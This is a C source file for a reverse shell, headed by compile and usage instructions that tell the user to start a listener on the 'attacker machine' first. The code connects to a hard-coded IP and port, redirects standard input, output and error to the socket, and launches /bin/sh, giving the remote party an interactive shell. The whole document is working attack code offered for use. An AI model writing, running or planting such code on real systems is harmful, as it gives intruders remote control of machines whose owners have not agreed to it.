/*

Compilation: gcc -o reverse-shell reverse-shell.c
Usage : ./reverse-shell 

Note : Run the program after starting listener on attacker machine.

*/

#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

int main(int argc, char *argv[])
{
    struct sockaddr_in src_addr;
    int fd;

    src_addr.sin_family = AF_INET;
    src_addr.sin_addr.s_addr = inet_addr("127.0.0.1"); //IP address
    src_addr.sin_port = htons(1234); //Port no

    fd = socket(AF_INET, SOCK_STREAM, 0);
    
    connect(fd, (struct sockaddr *)&src_addr, sizeof(src_addr));
    dup2(fd, 0);
    dup2(fd, 1);
    dup2(fd, 2);

    execve("/bin/sh", 0, 0);
    return 0;
}
